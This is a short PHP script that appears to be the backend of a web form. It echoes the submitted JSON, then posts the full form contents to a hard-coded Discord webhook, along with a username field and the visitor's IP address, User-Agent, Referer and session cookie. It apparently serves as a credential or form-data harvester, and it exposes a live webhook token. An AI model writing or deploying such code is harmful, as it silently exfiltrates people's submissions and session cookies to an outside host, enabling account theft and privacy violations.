<?php
session_name('SID');
session_start([
    'cookie_lifetime' => 86400,
    'use_strict_mode' => true,
]);

header('Content-Type: application/json; charset=UTF-8');
$input = json_decode(file_get_contents('php://input'), true);
echo json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);

{
    $url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f';
    $content = json_encode([
        'content' => "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
    $curl_req = curl_init($url);
    curl_setopt($curl_req, CURLOPT_POST, true);
    curl_setopt($curl_req, CURLOPT_POSTFIELDS, $content);
    curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen($content),
    ]);
    curl_exec($curl_req);
    curl_close($curl_req);
}
{
    $url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f';
    $content = "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```";
    $embed = [
        'title' => 'ユーザー名: ' . $input['formdata']['dlym6tweiywa2taq']['value'],
        'description' => 'IPアドレス: ' . $_SERVER['REMOTE_ADDR'] . "\n" .
                         'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . "\n" .
                         'Referer: ' . $_SERVER['HTTP_REFERER'] . "\n" .
                         'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
                         'Cookie: ' . $_COOKIE['SID'],
        'color' => hexdec('333333'),
        'timestamp' => date('c'),
    ];
    $curl_req = curl_init($url);
    curl_setopt($curl_req, CURLOPT_POST, true);
    curl_setopt($curl_req, CURLOPT_POSTFIELDS, json_encode(['content' => $content, 'embeds' => [$embed]], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
    curl_setopt($curl_req, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
    ]);
    curl_exec($curl_req);
    curl_close($curl_req);
}
